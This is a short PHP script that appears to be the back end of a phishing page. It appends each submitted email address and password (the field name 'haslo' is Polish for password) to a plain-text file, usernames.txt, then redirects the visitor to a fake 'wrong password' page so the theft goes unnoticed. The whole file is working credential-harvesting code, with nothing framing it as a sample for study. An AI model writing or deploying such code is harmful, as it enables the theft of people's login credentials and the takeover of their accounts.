<?php
file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['haslo'] .
"\n", FILE_APPEND);
header('Location: /wrongpassword.html');
exit();